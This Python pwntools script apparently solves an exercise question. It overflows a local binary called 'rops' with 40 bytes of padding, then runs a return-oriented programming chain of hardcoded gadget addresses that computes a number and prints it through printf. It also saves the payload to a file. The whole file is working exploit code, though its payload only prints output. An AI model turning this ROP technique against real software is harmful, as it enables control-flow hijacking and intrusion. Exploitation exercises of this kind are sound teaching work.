from pwn import *

# Set the binary file
binary = "./rops"

# Create a process
p = process(binary)

payload = b"A" * 40  # Padding to reach the return address in main()

#--------------------addresses--------------------

pop_eax= p32(0x080cf49a) # pop eax ; ret
pop_ecx = p32(0x080915f3) #pop ecx ; ret
pop_edi=p32(0x08049a9f) #pop edi ; ret
pop_esi=p32(0x080497c4) #pop esi ; ret

add_eax_ecx=p32(0x08075044)  #add eax , ecx ; ret
xchg_ecx_eax=p32(0x0806ba7b) #xchg ecx , eax ; ret

xchg_esi_eax = p32(0x08063c1a) # xchg esi , eax ; ret
push_esi_push_ecx_call_edi= p32(0x080614cb) #push esi ; push ecx ; call edi 

printf_addr=p32(0x08052230)
format_str_addr= p32(0x080d3037) #%d\n

#----------------------------------------------------

payload+=pop_eax
payload+=p32(0x00000000)
payload+=pop_ecx
payload+=p32(0x00000001)

for _ in range(12):
	payload+= add_eax_ecx
	payload+= xchg_ecx_eax  

payload+= xchg_esi_eax
payload+=pop_edi
payload+=printf_addr
payload+= pop_ecx
payload+=format_str_addr
payload+= push_esi_push_ecx_call_edi


# Send the payload to the binary
p.sendline(payload)
data=p.recvall().strip()
print(data)


#-------write the payload to a file-------------------
with open('solution_Q1', 'wb') as f:
    f.write(payload)
print("Payload saved to solution_Q1")

















